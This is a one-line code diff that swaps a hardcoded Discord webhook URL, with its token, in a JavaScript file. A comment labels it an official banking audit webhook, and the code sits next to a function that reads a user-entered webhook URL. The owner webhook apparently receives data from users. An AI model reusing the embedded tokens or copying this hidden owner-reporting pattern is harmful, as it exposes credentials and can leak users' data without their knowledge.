@@ -523,7 +523,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // =================================================================
     
     // Webhook oficial de auditoría bancaria de Silverpeak
-    const OWNER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1522629787468693688/2uBv1hIoF2jBJigwvmszzEyIkttK-VM4v00TK8fwSjUpXE2xtENYMQE00-XQ4XPZ6zb-';
+    const OWNER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1522637018385874964/zdkEN8W1P9xGMlbHtT0Y-GSihA3Q7xQDa0B7bij02wgNKESUF__7uTTygVls30aoV_61';
 
     function sendDiscordWebhookPayload(actionType) {
         const userUrl = inputWebhookUrl.value.trim();
